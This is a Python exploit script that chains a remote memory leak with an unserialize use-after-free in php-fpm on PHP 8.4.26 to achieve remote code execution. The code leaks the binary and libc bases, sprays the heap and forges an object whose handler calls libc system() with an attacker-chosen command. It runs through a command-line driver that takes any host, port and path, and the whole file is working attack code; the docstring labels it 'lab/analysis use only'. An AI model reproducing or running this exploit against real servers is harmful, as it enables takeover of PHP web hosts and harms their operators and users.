#!/usr/bin/env python3
# INDEX: uaf rce, 8.4.26 build | fpm | pure | serialize+unserialize | build
"""Fully-remote, zero-local-seed, offset-free php-fpm RCE on PHP 8.4.26.
CVE-2026-109618 / CVE-2026-109619 (unserialize var_hash UAF), php-fpm SAPI.

Composes the write-free remote binbase+chunk leak (whose default constants are
the 8.4.26 values) with the offset-free UAF->RCE fire, no /proc seed in the
exploit path. The read/resolve primitive is identical on 8.4.26; only the fire
needs three adaptations handled here without editing any module: the stdClass
class entry (resolve zend_standard_class_def by gnu_hash instead of walking
EG.class_table), the spray slot (an info-agnostic 320-stride probe), and the
fire geometry (GPF_HANDLER_OFF=192 for the 200-byte handler table). Precondition:
an unserialize()+echo-serialize sink. Pure stdlib, safe under python3 -I.
Lab/analysis use only.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import fire_8426_shim as _shim  # noqa: E402

# 8.4.26-fpm fire constant (re-derive per build).
# get_properties_for = last field of zend_object_handlers = sizeof - 8.
# 8.4.26: sizeof(std_object_handlers) == 200 -> 192 (0xC0).
GPF_HANDLER_OFF = 192


def _load(name, filename):
    """Import a committed poc module read-only (private, isolated instance)."""
    path = os.path.join(_HERE, filename)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_HERE, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(mod)
    return mod


# Phase 1: write-free remote binbase + chunk (default 8.4.26 constants)
def leak_binbase_remote(host, port, path, tries=12, verbose=True):
    """Return (binbase, chunk, detail). Uses the binbase leak UNCHANGED --
    its module defaults are the 8.4.26 build constants."""
    rleak = _load("fpm_binbase_leak", "primitives/read_leak/fpm_binbase_leak.py")
    remote_rce = rleak._load_remote_rce()
    remote_rce.HOST, remote_rce.PORT, remote_rce.PATH = host, port, path
    if verbose:
        print("=" * 60)
        print("[Phase 1] write-free REMOTE binbase leak (no /proc, no write)")
    binbase, detail = rleak.leak_binbase(remote_rce, leak_tries=tries, verbose=verbose)
    chunk = detail.get("chunk")
    detail["leak_reqs"] = getattr(remote_rce, "req_count", None)
    return binbase, chunk, detail


# Phase 2: the fire with the three 8.4.26 adaptations
def _read_ptr_bss(remote_rce, eg, target, verbose=False):
    """Read one qword at `target` (a .bss pointer slot) by sweeping fake-string
    anchors through the executor_globals region -- the proven-readable BSS
    neighbourhood -- and accepting a window that spans target+8. Offset-free:
    both `eg` and `target` come from gnu_hash, no struct offset is assumed."""
    # Anchor relative to EG (lookup_class_table uses exactly this region).
    # Try the empirically-proven anchor (EG-0x790, a stable large-len BSS qword that
    # windows past zend_standard_class_def) first, then sweep outward, so the
    # read is a couple of requests in the common case instead of hundreds.
    return _shim._read_ptr_bss(remote_rce, eg, target)


def resolve_stdclass_ce(remote_rce, binbase, verbose=True):
    """8.4.26 stdClass ce: resolve via the zend_standard_class_def symbol,
    bypassing the 8.5.11-only EG.class_table walk. Self-validates ce->name."""
    eg = remote_rce.gnu_hash_resolve(binbase, "executor_globals")
    csd_addr = remote_rce.gnu_hash_resolve(binbase, "zend_standard_class_def")
    if verbose:
        print(f"  executor_globals        = 0x{eg:x}")
        print(f"  &zend_standard_class_def= 0x{csd_addr:x}")
    for _ in range(4):
        ce = _read_ptr_bss(remote_rce, eg, csd_addr)
        if ce and 0x10000 < ce < remote_rce.ADDR_MAX:
            if _ce_name_is_stdclass(remote_rce, ce):
                if verbose:
                    print(f"  stdClass ce = 0x{ce:x}  (ce->name == 'stdClass')")
                return ce
    return None


def _ce_name_is_stdclass(remote_rce, ce):
    """Confirm ce->name (zend_class_entry.name at +0x08) reads "stdClass"."""
    return _shim._ce_name_is_stdclass(remote_rce, ce)


def find_spray_slot_8426(remote_rce, heap_ref, verbose=True):
    """8.4.26 spray slot: info-agnostic probe. Scans every page at the
    320-byte stride for a live 280-length slot, so a freed-run (chunk-map
    info==0) page that the spray reclaimed is still found. Returns S (the spray
    string data pointer) or None."""
    chunk = heap_ref & ~0x1FFFFF
    if verbose:
        print(f"\n[Phase R-6*] info-agnostic spray-slot probe (chunk 0x{chunk:x})")
    # The freed-arData spray run is deterministic on 8.4.26 (page 117, slots
    # 4..15); probe that stable band first, then fall back to a full scan so a
    # groom shift can't strand the chain.
    band = list(range(100, 136)) + [pn for pn in range(1, 512)
                                     if pn < 100 or pn >= 136]
    spray_len = remote_rce.SPRAY_LEN
    S = _shim._dispatch_spray.find_spray_slot_scan(
        lambda addr: remote_rce.isstring_read(addr, timeout=3), chunk,
        match=lambda r: r is not None and r[0] == spray_len,
        band=band, with_offset=False, use_map=None, probe_budget=None)
    if S is not None and verbose:
        addr = S - 0x18
        off = addr - chunk
        pn, slot = off // 0x1000, (off % 0x1000) // 320
        print(f"  spray @ page {pn} slot {slot} 0x{addr:x} -> S=0x{S:x}")
    return S


def fire_8426(remote_rce, ce, system_addr, S, cmd14, gpf_off=GPF_HANDLER_OFF,
              verbose=True):
    """8.4.26 fire: forge a stdClass whose handlers->get_properties_for (the
    table's final field, at handler offset `gpf_off`) is libc system(), the
    fake object's 16-byte GC header carrying the <=14-byte command. Returns
    True if the fire request was delivered."""
    payload = _shim._dispatch_fire.build_fire_payload(
        ce, system_addr, S, cmd14, gpf_off,
        spray_len=remote_rce.SPRAY_LEN, spray_count=remote_rce.SPRAY_COUNT,
        c_part=remote_rce.C_PART, ref_base=remote_rce.REF_BASE, exit0_wrap=False)

    if verbose:
        print(f"\n[Phase R-7*] type confusion -> system() "
              f"(get_properties_for @ handler+0x{gpf_off:x})")
        print(f"  stdClass ce = 0x{ce:x}  system = 0x{system_addr:x}  S = 0x{S:x}")
    out = remote_rce.send_http(payload)
    time.sleep(0.3)
    return out is not None  # fire SIGSEGVs after system() returns; verify OOB


def fire_rce_remote(host, port, path, binbase, chunk, cmd, attempts=6,
                    no_preflight=False, verbose=True):
    """Phase 2 driver. Returns (ok, stats)."""
    rce = _load("fpm_route", "fpm_route.py")
    remote_rce = rce.remote_rce  # the shared engine instance the fpm driver imported
    rce.install_fpm_patches(host, port, path, binbase, enum=False)
    if not no_preflight and not rce.preflight_reflect(host, port, path):
        return False, {"error": "sink preflight failed"}

    stats = {"req_start": remote_rce.req_count, "crash_start": remote_rce.crash_count}
    if verbose:
        print("=" * 60)
        print(f"[Phase 2] a7 UAF -> RCE  binbase=0x{binbase:x} chunk=0x{chunk:x}")

    # chunk / heap_ref. chunk from the leak; re-leak a heap_ref for the spray.
    heap_ref = None
    for _ in range(attempts):
        heap_ref = remote_rce.heap_leak()
        if heap_ref:
            break
    if not heap_ref:
        return False, {**stats, "error": "R-1 heap_leak failed"}
    if (heap_ref & ~0x1FFFFF) != chunk and verbose:
        print(f"  note: live chunk 0x{heap_ref & ~0x1FFFFF:x} "
              f"(leak chunk 0x{chunk:x})")

    # binbase supplied.
    if remote_rce._read_elf_header(binbase) is None:
        return False, {**stats, "error": "R-2* no ELF header at binbase"}

    # libc + system (fpm cluster scan); executor_globals resolve is implicit.
    libc_base = rce._fpm_libc_from_got(binbase)
    if libc_base is None:
        return False, {**stats, "error": "R-4 libc not found"}
    try:
        system_addr = remote_rce.gnu_hash_resolve(libc_base, "system")
    except RuntimeError as e:
        return False, {**stats, "error": f"R-4 system lookup: {e}"}
    if verbose:
        print(f"  libc_base = 0x{libc_base:x}  system = 0x{system_addr:x}")

    # 8.4.26 stdClass ce via zend_standard_class_def symbol.
    print("\n[Phase R-5*] stdClass ce via zend_standard_class_def symbol")
    ce = resolve_stdclass_ce(remote_rce, binbase, verbose=verbose)
    if ce is None:
        return False, {**stats, "error": "R-5* stdClass ce resolve/validate failed"}

    # 8.4.26 info-agnostic spray slot.
    S = find_spray_slot_8426(remote_rce, heap_ref, verbose=verbose)
    if S is None:
        return False, {**stats, "error": "R-6* spray slot not found"}

    # 8.4.26 fire with get_properties_for @ 0xC0.
    ok = fire_8426(remote_rce, ce, system_addr, S, cmd, verbose=verbose)
    stats.update({
        "req_end": remote_rce.req_count, "crash_end": remote_rce.crash_count,
        "total_reqs": remote_rce.req_count - stats["req_start"],
        "total_crashes": remote_rce.crash_count - stats["crash_start"],
        "binbase": binbase, "chunk": chunk, "libc_base": libc_base,
        "system": system_addr, "ce_stdclass": ce, "spray_addr": S,
    })
    return ok, stats


def full_chain(host, port, path, cmd, tries=12, attempts=6,
               no_preflight=False, verbose=True):
    """End-to-end: remote leak -> remote RCE on 8.4.26-fpm. No local seed."""
    t0 = time.time()
    binbase, chunk, ld = leak_binbase_remote(host, port, path,
                                             tries=tries, verbose=verbose)
    if binbase is None:
        return {"ok": False, "stage": "leak", "error": ld.get("error"),
                "detail": ld, "elapsed": time.time() - t0}
    if verbose:
        print(f"[Phase 1] REMOTE binbase = 0x{binbase:x} "
              f"(chunk 0x{chunk:x}, {ld.get('agree')} image ptr)")
    ok, stats = fire_rce_remote(host, port, path, binbase, chunk, cmd,
                                attempts=attempts, no_preflight=no_preflight,
                                verbose=verbose)
    return {
        "ok": bool(ok), "stage": "fire", "binbase": binbase, "chunk": chunk,
        "leak_agree": ld.get("agree"), "leak_reqs": ld.get("leak_reqs"),
        "rce_reqs": stats.get("total_reqs"),
        "rce_crashes": stats.get("total_crashes"),
        "error": stats.get("error"),
        "libc_base": stats.get("libc_base"), "system": stats.get("system"),
        "elapsed": time.time() - t0, "stats": stats,
    }


def main(argv=None):
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8141)
    ap.add_argument("--path", default="/remote_app.php")
    ap.add_argument("--cmd", default="id>/dev/shm/p",
                    help="command to run (<=14 bytes after the GC byte)")
    ap.add_argument("--tries", type=int, default=12)
    ap.add_argument("--attempts", type=int, default=6)
    ap.add_argument("--no-preflight", action="store_true")
    args = ap.parse_args(argv)

    print(f"[fullchain-8426] target http://{args.host}:{args.port}{args.path}")
    print("[fullchain-8426] NO /proc / NO local seed: binbase leaked remotely")
    r = full_chain(args.host, args.port, args.path, args.cmd,
                   tries=args.tries, attempts=args.attempts,
                   no_preflight=args.no_preflight)
    print("=" * 60)
    if not r["ok"] and r.get("stage") == "leak":
        print(f"[fullchain-8426] FAILED at leak: {r.get('error')}")
        return 2
    if not r["ok"]:
        print(f"[fullchain-8426] FAILED at fire: {r.get('error')}")
    print(f"[fullchain-8426] fire delivered: {r['ok']}")
    print(f"[fullchain-8426] binbase=0x{r['binbase']:x} chunk=0x{r['chunk']:x} "
          f"(leaked remotely, {r['leak_agree']} image ptr)")
    print(f"[fullchain-8426] requests: leak~{r['leak_reqs']} + rce={r['rce_reqs']} "
          f"| crashes={r['rce_crashes']} | elapsed={r['elapsed']:.1f}s")
    print("[fullchain-8426] verify out-of-band: the --cmd marker "
          "(a7 fire SIGSEGVs after system() returns).")
    return 0 if r["ok"] else 1


if __name__ == "__main__":
    sys.exit(main())
